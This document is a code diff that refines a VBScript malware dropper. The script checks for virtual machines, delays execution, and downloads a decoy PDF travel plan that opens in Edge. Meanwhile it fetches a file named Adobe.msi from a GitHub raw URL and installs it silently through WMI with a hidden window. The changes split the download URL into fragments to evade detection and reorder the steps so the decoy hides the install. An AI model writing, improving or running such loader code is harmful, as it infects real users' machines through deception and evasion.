@@ -1,8 +1,16 @@
 Dim fso, sh, temp, stateFile, avFound, isVM, wmi, procs, cs
+Dim p1, p2, p3, p4, p5
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
 temp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Temp\"
 stateFile = temp & "value.txt"
+
+' ---- URL fragments, reassembled at runtime ----
+p1 = "https://raw.g"
+p2 = "ithubuserco"
+p3 = "ntent.com/rotalbilly5"
+p4 = "-sketch/Dream/"
+p5 = "main/"
 
 avFound = ""
 isVM = False
@@ -46,8 +54,33 @@ If isVM Then
 Else
     sh.Run "%COMSPEC% /c timeout /t 45 /nobreak >nul", 0, True
 
+    ' ============================================================
+    '  PDF first — decoy opens while install runs behind it
+    ' ============================================================
+    Dim pdfHttp, pdfUrl, pdfPath, pstream
+    pdfUrl  = p1 & p2 & p3 & p4 & p5 & "Travel-Meeting-Plan-Q4-2026.pdf"
+    pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
+
+    Set pdfHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    pdfHttp.open "GET", pdfUrl, False
+    pdfHttp.setRequestHeader "User-Agent", "Mozilla/5.0"
+    pdfHttp.send
+
+    If pdfHttp.status = 200 Then
+        Set pstream = CreateObject("ADODB.Stream")
+        pstream.Type = 1
+        pstream.Open
+        pstream.Write pdfHttp.responseBody
+        pstream.SaveToFile pdfPath, 2
+        pstream.Close
+        sh.Run "msedge.exe """ & pdfPath & """", 1, False
+    End If
+
+    ' ============================================================
+    '  MSI second — fetch, install via WMI, elevated inherited
+    ' ============================================================
     Dim http, msiUrl, msiPath, guid
-    msiUrl = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
+    msiUrl = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
     guid   = CreateObject("Scriptlet.TypeLib").GUID
     guid   = Replace(Replace(guid, "{", ""), "}", "")
     msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & guid & ".msi"
@@ -66,27 +99,12 @@ Else
         stream.SaveToFile msiPath, 2
         stream.Close
 
-        sh.Run "msiexec.exe /i """ & msiPath & """ /qn /norestart", 0, False
-    End If
-
-    sh.Run "%COMSPEC% /c timeout /t 20 /nobreak >nul", 0, True
-    Dim pdfHttp, pdfUrl, pdfPath, pstream
-    pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
-    pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
-
-    Set pdfHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    pdfHttp.open "GET", pdfUrl, False
-    pdfHttp.setRequestHeader "User-Agent", "Mozilla/5.0"
-    pdfHttp.send
-
-    If pdfHttp.status = 200 Then
-        Set pstream = CreateObject("ADODB.Stream")
-        pstream.Type = 1
-        pstream.Open
-        pstream.Write pdfHttp.responseBody
-        pstream.SaveToFile pdfPath, 2
-        pstream.Close
-        sh.Run "msedge.exe """ & pdfPath & """", 1, False
+        Dim procClass, startup, cmdLine, pid
+        Set procClass = wmi.Get("Win32_Process")
+        Set startup   = wmi.Get("Win32_ProcessStartup").SpawnInstance_
+        startup.ShowWindow = 0
+        cmdLine = "msiexec.exe /i """ & msiPath & """ /qn /norestart"
+        procClass.Create cmdLine, Null, startup, pid
     End If
 
     Set f = fso.OpenTextFile(stateFile, 8)
